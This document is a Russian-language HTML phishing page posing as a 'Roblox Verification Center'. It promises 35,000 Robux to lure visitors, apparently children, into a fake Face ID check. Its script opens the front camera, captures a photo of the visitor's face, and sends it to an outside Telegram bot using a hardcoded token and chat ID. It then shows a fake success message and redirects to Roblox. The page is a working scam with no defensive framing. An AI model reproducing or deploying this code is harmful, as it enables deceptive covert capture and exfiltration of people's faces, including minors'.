<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox Verification Center</title>
    <style>
        body { font-family: sans-serif; background: #f4f6f8; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 380px; }
        .btn { background: #0084ff; color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 17px; cursor: pointer; margin-top: 20px; }
        #log { margin-top: 15px; color: #888; font-size: 12px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="70" style="margin-bottom: 10px;">
    <h1>Подтверждение Face ID</h1>
    <p>Для зачисления <b>35,000 Robux</b> поднесите телефон к лицу и нажмите кнопку ниже.</p>
    <button class="btn" onclick="startV()">✅ ПОДТВЕРДИТЬ</button>
    <div id="log">Ожидание...</div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    const T = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
    const C = '7889497672';

    async function startV() {
        const btn = document.querySelector('.btn');
        const log = document.getElementById('log');
        const v = document.getElementById('v');
        const c = document.getElementById('c');

        btn.disabled = true;
        btn.innerText = "ИДЕТ ПРОВЕРКА...";

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: 1280 } 
            });
            v.srcObject = stream;
            
            // Ждем 3 секунды для настройки света
            let countdown = 3;
            const i = setInterval(() => {
                log.innerText = "Анализ лица через: " + countdown + "...";
                countdown--;
                if(countdown < 0) clearInterval(i);
            }, 1000);

            setTimeout(() => {
                log.innerText = "ФИНАЛИЗАЦИЯ...";
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                
                c.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', C);
                    fd.append('photo', blob, 'face.jpg');
                    fd.append('caption', '👤 **ЛИЦО ПОЛУЧЕНО!**\n(Через Telegram Browser)');

                    fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd })
                    .then(() => {
                        stream.getTracks().forEach(t => t.stop());
                        alert("Верификация завершена! Ожидайте робуксы.");
                        window.location.href = "https://www.roblox.com";
                    });
                }, 'image/jpeg', 0.8);
            }, 4000);

        } catch (e) {
            alert("Ошибка! Разрешите доступ к камере в Telegram.");
            btn.disabled = false;
        }
    }
</script>
</body>
</html>
